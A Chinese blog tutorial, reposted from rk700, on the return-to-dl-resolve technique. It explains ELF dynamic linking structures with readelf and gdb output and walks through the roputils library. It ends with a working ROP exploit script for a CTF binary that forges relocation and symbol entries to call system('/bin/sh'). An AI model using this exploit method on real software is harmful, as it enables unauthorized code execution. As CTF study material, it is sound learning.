原文 by [rk700](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)  

我们都知道，ELF在执行时，许多函数的地址是lazy binding的，即在第一次调用时才会解析其地址并填充至.got.plt。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在.plt中完成。其实之前Tiger有告诉我有一个名为[roputils](https://github.com/inaz2/roputils)的工具，利用的就是构造所需信息，直接解析得到system的地址进而ROP。但直到最近才去研究其代码，搞明白这一技术，即return to dl-resolve，具体是怎么回事。  

关于这一技术，在phrack的[某一期](http://phrack.org/issues/58/4.html#article)有具体介绍。在此，我们首先以32位为例，阐述其基本原理；之后则会分析64位环境下这一技术的一些注意点。  

## 32位环境下return to dl-resolve
ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。其内容示例如下:  
```
$ readelf -d bof32

Dynamic section at offset 0x614 contains 24 entries:
Tag        Type                         Name/Value
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000c (INIT)                       0x80482b0
0x0000000d (FINI)                       0x80484f4
0x00000019 (INIT_ARRAY)                 0x8049608
0x0000001b (INIT_ARRAYSZ)               4 (bytes)
0x0000001a (FINI_ARRAY)                 0x804960c
0x0000001c (FINI_ARRAYSZ)               4 (bytes)
0x6ffffef5 (GNU_HASH)                   0x804818c
0x00000005 (STRTAB)                     0x804820c
0x00000006 (SYMTAB)                     0x80481ac
0x0000000a (STRSZ)                      80 (bytes) 0x0000000b (SYMENT)                     16 (bytes)
0x00000015 (DEBUG)                      0x0
0x00000003 (PLTGOT)                     0x8049700
0x00000002 (PLTRELSZ)                   32 (bytes)
0x00000014 (PLTREL)                     REL
0x00000017 (JMPREL)                     0x8048290
0x00000011 (REL)                        0x8048288
0x00000012 (RELSZ)                      8 (bytes)
0x00000013 (RELENT)                     8 (bytes)
0x6ffffffe (VERNEED)                    0x8048268
0x6fffffff (VERNEEDNUM)                 1
0x6ffffff0 (VERSYM)                     0x804825c
0x00000000 (NULL)                       0x0
```
其中的JMPREL segment，对应于.rel.plt section，是用来保存运行时重定位表的。它与.rel.dyn类似，只不过.rel.plt是用于函数重定位，.rel.dyn是用于变量重定位。具体地，其内容如下:  
```
$ readelf -r bof32

Relocation section '.rel.dyn' at offset 0x288 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
080496fc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x290 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804970c  00000107 R_386_JUMP_SLOT   00000000   read 08049710  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__
08049714  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main
08049718  00000407 R_386_JUMP_SLOT   00000000   write
```
可以看到，.rel.plt里包含4个条目。事实上，之前.dynamic section中的PLTRELSZ即为.rel.plt的总大小，32 bytes；PLTREL则指明这些条目的类型为REL；RELENT指明了每个REL类型条目的大小，8 bytes。于是32/8=4即为条目个数。  

这些条目的类型是Elf32_Rel，其定义如下  
``` c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
#define ELF32_R_SYM(val) ((val) >> 8) #define ELF32_R_TYPE(val) ((val) & 0xff)
```
我们以.rel.plt第一条，即read的条目为例，对比调试器显示的结果：  
```
gdb-peda$ x/2x 0x8048290
0x8048290:      0x0804970c      0x00000107
```
显示的结果与之前 $ readelf -r的结果是相符的。具体地，r_offset即为该函数在.got.plt中的地址:  
```
gdb-peda$ x/3i read  0x80482f0 <read@plt>:        jmp    DWORD PTR ds:0x804970c
   0x80482f6 <read@plt+6>:      push   0x0
   0x80482fb <read@plt+11>:     jmp    0x80482e0
```
而r_info则保存的是其类型和符号序号。根据宏的定义，可知对于此条目，其类型为ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT；其symbol index则为RLF32_R_SYM(r_info)=1。  

注意到之前$ readelf -r所得到的结果中，包含有Sym.Value和Sym. Name信息。而这些信息就是通过symbol index找到的。具体地，.dynamic section中的SYMTAB，即.dynsym section，保存的便是相关的符号信息。每一条symbol信息的大小在SYMENT中体现，为16 bytes。通过$ readelf -s来查看其内容如下：  
```
$ readelf -s bof32

Symbol table '.dynsym' contains 6 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)
     5: 0804850c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used

Symbol table '.symtab' contains 74 entries:
...
```
(注意我们这里只看.dynsym，因为它是运行时所需的。诸如export/import的符号信息全在这里。而.symtab是编译时的符号信息，这部分在strip之后会被删除掉。)  

可以看到，之前所说的read函数的符号信息条目index确实为1。我们通过调试器来看看其实际内容：  
```
gdb-peda$ x/4x 0x80481ac+16
0x80481bc:      0x0000001a      0x00000000      0x00000000      0x00000012
```
对比符号条目的定义如下：  
``` c
typedef struct
{
  Elf32_Word    st_name;   /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;  /* Symbol value */
  Elf32_Word    st_size;   /* Symbol size */
  unsigned char st_info;   /* Symbol type and binding */
  unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
  Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;
```
其结果与$ readelf -r, $ readelf -s的结果相符。具体地，st_name保存的是该符号名称在STRTAB，即.dynstr中的地址：  
```
gdb-peda$ x/s 0x804820c+0x1a
0x8048226:      "read"
```
而对于其他项，如st_info，st_other等，我还没搞明白对应的意义。但在实际构造时，只需选择和其他相同的值应该即可。  

OK，以上便是相关背景知识。现在我们来看看在call read@plt时具体发生了什么。  
```
gdb-peda$ x/3i read  0x80482f0 <read@plt>:        jmp    DWORD PTR ds:0x804970c
   0x80482f6 <read@plt+6>:      push   0x0
   0x80482fb <read@plt+11>:     jmp    0x80482e0
gdb-peda$ x/wx 0x804970c
0x804970c <read@got.plt>:       0x080482f6
gdb-peda$ x/2i 0x80482e0
   0x80482e0:   push   DWORD PTR ds:0x8049704
   0x80482e6:   jmp    DWORD PTR ds:0x8049708
```
在第一次调用时，jmp read@got.plt会跳回read@plt，这是我们已经知道的。接下来，会将参数push到栈上并跳至.got.plt+0x8，这相当于调用以下函数：  
```
_dl_runtime_resolve(link_map, rel_offset);
```
_dl_runtime_resolve则会完成具体的符号解析，填充结果，和调用的工作。具体地。根据rel_offset，找到重定位条目：  
```
Elf32_Rel * rel_entry = JMPREL + rel_offset;
```
根据rel_entry中的符号表条目编号，得到对应的符号信息：  
```
Elf32_Sym *sym_entry = SYMTAB[ELF32_R_SYM(rel_entry->r_info)];
```
再找到符号信息中的符号名称：  
```
char *sym_name = STRTAB + sym_entry->st_name;
```
由此名称，搜索动态库。找到地址后，填充至.got.plt对应位置。最后调整栈，调用这一解析得到的函数。  

于是，我们的思路是，提供一个很大的数作为rel_offset给_dl_runtime_resolve，使得找到rel_entry落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数地址并调用了。值得注意的是，在解析过程中，还会对ELF32_R_TYPE(rel_entry->r_info)等进行检查。但这些数据我们只需仿照正常的来构造即可，重点是对应的伪条目的index应计算正确。  

作为实例，我们来看看roputils里是如何构造伪条目的。首先是函数dl_resolve_data。其定义如下：  
``` python

    def dl_resolve_data(self, base, name):
        jmprel = self.dynamic('JMPREL')
        relent = self.dynamic('RELENT')
        symtab = self.dynamic('SYMTAB')
        syment = self.dynamic('SYMENT')
        strtab = self.dynamic('STRTAB')

        addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
        addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)
        addr_symstr = addr_sym + syment

        r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
        st_name = addr_symstr - strtab

        buf = self.fill(padlen_reloc)
        buf += struct.pack('<II', base, r_info)                      # Elf32_Rel
        buf += self.fill(padlen_sym)
        buf += struct.pack('<IIII', st_name, 0, 0, 0x12)             # Elf32_Sym
        buf += self.string(name)

        return buf
```
从base开始便是用户可控的区域，也是用来构造伪Elf32_Rel, 伪Elf32_Sym，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。  

其次便是函数dl_resolve_call了。其定义如下：  
``` python

    def dl_resolve_call(self, base, *args):
        jmprel = self.dynamic('JMPREL')
        relent = self.dynamic('RELENT')

        addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
        reloc_offset = addr_reloc - jmprel

        buf = self.p(self.plt())
        buf += self.p(reloc_offset)
        buf += self.p(self.gadget('pop', n=len(args)))
        buf += self.p(args)

        return buf
```
可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪Elf32_Rel条目的offset，最后则是.plt起始处的地址，在那里会完成将link_map放至栈上及调用_dl_runtime_resolve。  

## 64位环境下return to dl-resolve  
相比32位，其实基本原理还是相同的。只是由于位数增加，一些结构体发生变化；此外，函数参数也变成由寄存器传递而非栈传递。  

具体地，我们看64位relocation entry的定义。首先通过$ readelf -d可知，现在的类型为RELA，大小RELAENT为24 bytes：  
```
$ readelf -d bof64

Dynamic section at offset 0x7b0 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x4003e0
 0x000000000000000d (FINI)               0x400634
 0x0000000000000019 (INIT_ARRAY)         0x600798
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x6007a0
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x400260
 0x0000000000000005 (STRTAB)             0x4002f8
 0x0000000000000006 (SYMTAB)             0x400280
 0x000000000000000a (STRSZ)              67 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x600988
 0x0000000000000002 (PLTRELSZ)           96 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x400380
 0x0000000000000007 (RELA)               0x400368
 0x0000000000000008 (RELASZ)             24 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffe (VERNEED)            0x400348
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x40033c
 0x0000000000000000 (NULL)               0x0
```
其定义如下：  
``` c
typedef __u16   Elf64_Half;
typedef __u32   Elf64_Word;
typedef __u64   Elf64_Addr;
typedef __u64   Elf64_Xword;
typedef __s64   Elf64_Sxword;

typedef struct elf64_rela {
  Elf64_Addr r_offset;  /* Location at which to apply the action */
  Elf64_Xword r_info;   /* index and type of relocation */
  Elf64_Sxword r_addend;    /* Constant addend used to compute value */
} Elf64_Rela;
#define ELF64_R_SYM(i) ((i) >> 32) #define ELF64_R_TYPE(i) ((i) & 0xffffffff)
```
相应地，在roputils中，64位下构造伪Elf64_Rela的代码如下：  
``` python

...
        r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
...
        buf += struct.pack('<QQQ', base, r_info, 0)                  # Elf64_Rela
```
SYMTAB中的条目定义则变化如下：  
``` c
typedef struct elf64_sym {
  Elf64_Word st_name;       /* Symbol name, index in string tbl */
  unsigned char st_info;    /* Type and binding attributes */
  unsigned char st_other;   /* No defined meaning, 0 */
  Elf64_Half st_shndx;      /* Associated section index */
  Elf64_Addr st_value;      /* Value of the symbol */
  Elf64_Xword st_size;      /* Associated symbol size */
} Elf64_Sym;
```
可以看到，st_info，st_other等的位置被提前了。对应于roputils中的代码则为：  

 `buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym`  
以上便是相关结构的变更情况。接下来，我们看roputils中传递函数参数的相关代码。  

首先，看看64位下.plt中解析函数地址的代码：  
```
gdb-peda$ x/3i read  0x400420 <read@plt>: jmp    QWORD PTR [rip+0x200582]        # 0x6009a8 <read@got.plt>
   0x400426 <read@plt+6>:       push   0x1
   0x40042b <read@plt+11>:      jmp    0x400400
gdb-peda$ x/2i 0x400400
   0x400400:    push   QWORD PTR [rip+0x20058a]        # 0x600990
   0x400406:    jmp    QWORD PTR [rip+0x20058c]        # 0x600998
```
可以看到，给_dl_runtime_resolve传递的参数仍然是两个，但第二个参数已由之前32位的相对JMPREL的偏移变为该条目的在数组中的index。相应地，roputils在这里也进行了改变：  
``` python
...
        addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)
        reloc_offset = (addr_reloc - jmprel) / relaent

        buf = self.p(self.plt())
        buf += self.p(reloc_offset)
...
```
另外，注意到给_dl_runtime_resolve传递参数的方式，依然是通过栈，而非一般情况下通过寄存器传递。这是因为此时的寄存器rdi等中已经存有要解析的函数所需的参数了。具体地，roputils中是通过某些gadget来将所需的参数，如/bin/sh的地址，保存在寄存器中。  

然而，阅读roputils的示例代码，我们发现它还会在解析函数地址之前，将link_map+0x1c8处设为NULL。我们试着去掉这一操作，再执行发现遇到segfault了：  
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x40033c --> 0x2000200020000
RBX: 0x600efc --> 0x600efc66477747
RCX: 0x155dc00000007
RDX: 0x155dc
RSI: 0x600f20 --> 0x1200200c40
RDI: 0x4002f8 --> 0x6f732e6362696c00 ('')
RBP: 0x0
RSP: 0x600da8 --> 0x0
RIP: 0x7ffff7de9448 (<_dl_fixup+120>:   movzx  eax,WORD PTR [rax+rdx*2])
R8 : 0x600f00 --> 0x600efc --> 0x600efc66477747
R9 : 0x7ffff7dea4e0 (<_dl_fini>:        push   rbp)
R10: 0x7ffff7ffe130 --> 0x0
R11: 0x246
R12: 0x0
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7de943b <_dl_fixup+107>:      test  rax,rax
   0x7ffff7de943e <_dl_fixup+110>:      je     0x7ffff7de9530 <_dl_fixup+352>
   0x7ffff7de9444 <_dl_fixup+116>:      mov    rax,QWORD PTR [rax+0x8]
=> 0x7ffff7de9448 <_dl_fixup+120>:      movzx  eax,WORD PTR [rax+rdx*2]
   0x7ffff7de944c <_dl_fixup+124>:      and    eax,0x7fff
   0x7ffff7de9451 <_dl_fixup+129>:      lea    rdx,[rax+rax*2]
   0x7ffff7de9455 <_dl_fixup+133>:      mov    rax,QWORD PTR [r10+0x2e0]
   0x7ffff7de945c <_dl_fixup+140>:      lea    r8,[rax+rdx*8]
[------------------------------------stack-------------------------------------]
0000| 0x600da8 --> 0x0
0008| 0x600db0 --> 0x600f20 --> 0x1200200c40
0016| 0x600db8 --> 0x0
0024| 0x600dc0 --> 0x0
0032| 0x600dc8 --> 0x0
0040| 0x600dd0 --> 0x7ffff7defd00 (<_dl_runtime_resolve+80>:    mov    r11,rax)
0048| 0x600dd8 ("jweM5ZXF")
0056| 0x600de0 --> 0x0
[------------------------------------------------------------------------------]
```
这其中，rax=0x40033c是.gnu.version所在。而这里还存在一处检查。查看dl-runtime.c文件，这部分对应的代码如下：  
``` c
   /* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      const ElfW(Half) *vernum =
        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
      version = &l->l_versions[ndx];
      if (version->hash == 0)
        version = NULL;
    }
```
这里，应该是由于我们构造的伪symbol的index过大，使得vernum[ELFW(R_SYM) (reloc->r_info)]读取出错。为了绕过这部分，roputils选择的方法便是令l->l_info[VERSYMIDX (DT_VERSYM)] == NULL。相关的汇编代码如下：  
```
...
   0x00007ffff7de9434 <+100>:   mov    rax,QWORD PTR [r10+0x1c8]
   0x00007ffff7de943b <+107>:   test  rax,rax
   0x00007ffff7de943e <+110>:   je     0x7ffff7de9530 <_dl_fixup+352>
   0x00007ffff7de9444 <+116>:   mov    rax,QWORD PTR [rax+0x8]
=> 0x00007ffff7de9448 <+120>:   movzx  eax,WORD PTR [rax+rdx*2]
   0x00007ffff7de944c <+124>:   and    eax,0x7fff
...
```
这里的r10保存的便是link_map的地址，所以只需QWORD PTR [r10+0x1c8]处为NULL即可跳过这一段。这便是roputils中这一操作的由来。  

## 实例
这里选取的是去年ISG初赛的pwnme。这是一道漏洞很明显，但利用起来较复杂的题目。二进制文件基本信息如下：  
```
$ checksec --file pwnme 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwnme
```
主函数内即存在溢出，具体汇编代码如下：  
```
...
  4005bd:       55                      push   %rbp
  4005be:       48 89 e5                mov    %rsp,%rbp
  4005c1:       48 83 ec 10             sub    $0x10,%rsp
  4005c5:       bf 3c 00 00 00          mov    $0x3c,%edi
  4005ca:       e8 c1 fe ff ff          callq  400490 <alarm@plt>
  4005cf:       ba 13 00 00 00          mov    $0x13,%edx
  4005d4:       be 84 06 40 00          mov    $0x400684,%esi
  4005d9:       bf 01 00 00 00          mov    $0x1,%edi
  4005de:       e8 9d fe ff ff          callq  400480 <write@plt>
  4005e3:       48 8d 45 f0             lea    -0x10(%rbp),%rax
  4005e7:       ba 00 01 00 00          mov    $0x100,%edx
  4005ec:       48 89 c6                mov    %rax,%rsi
  4005ef:       bf 00 00 00 00          mov    $0x0,%edi
  4005f4:       e8 a7 fe ff ff          callq  4004a0 <read@plt>
  4005f9:       b8 00 00 00 00          mov    $0x0,%eax
  4005fe:       c9                      leaveq
  4005ff:       c3                      retq
...
```
可以看到，这里有调用read和write，可供我们读写内存。但由于二进制文件本身较简略，构造ROP chain比较有技术含量。我们队当时并没有做出来这道题，赛后看writeup，大多是利用ROP来mem leak，读取足够的内存后构造出execve得到shell。  

但是，如果使用return to dl-resolve技术，利用roputils，则可以1分钟之内傻瓜式解决……我就只是把roputils自带的examples中的dl-resolve-x86-64.py稍作修改即完成。改后的代码如下：  
``` python
#!/usr/bin/env python2

from roputils import *

fpath = sys.argv[1]
offset = 0x18

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
ptr_ret = rop.search(rop.section('.fini'))

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['write', 1, rop.got()+8, 8],
    ['read', 0, addr_stage, 420]
, pivot=addr_stage)
buf += rop.fill(0x100, buf)

p = Proc(rop.fpath)
p.write(buf)
p.read(0x13)
addr_link_map = p.read_p64()
print("link_map is at %s" % hex(addr_link_map))
addr_dt_debug = addr_link_map + 0x1c8

buf = rop.call_chain_ptr(
    ['read', 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+400]
)
buf += rop.dl_resolve_call(addr_stage+300)
buf += rop.fill(300, buf)
buf += rop.dl_resolve_data(addr_stage+300, 'system')
buf += rop.fill(400, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(420, buf)

p.write(buf)
p.write_p64(0)
p.interact(0)
```
确实相比mem leak构造ROP，简洁太多了……  

## 总结
之前，我的ROP方式，基本都是通过mem leak，读.got.plt，找到system的地址并调用；极少数情况下，无法mem leak，则是完全根据已有的gadget拼出ROP chain。现在，有了return to dl-resolve，就添加了一种思路。当然，对于64位，这种技术依然需要有读、写内存的gadgets。从理论上讲，有了这些gadgets, mem leak去找system的地址应该也可以。但相对来说，return to dl-resolve显得简洁、优雅一些。现在64位return to dl-resolve需要读内存，是为了找到link_map+0x1c8的地址以便写入。如果能够继续研究出不需要读内存的方法，则面对当下主流的64位NX, ASLR，return to dl-resolve的可适性会更加高。

## 参考
http://phrack.org/issues/58/4.html#article  

http://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html  

https://www.cs.stevens.edu/~jschauma/631/elf.html  

http://inaz2.hatenablog.com/entry/2014/07/27/205322  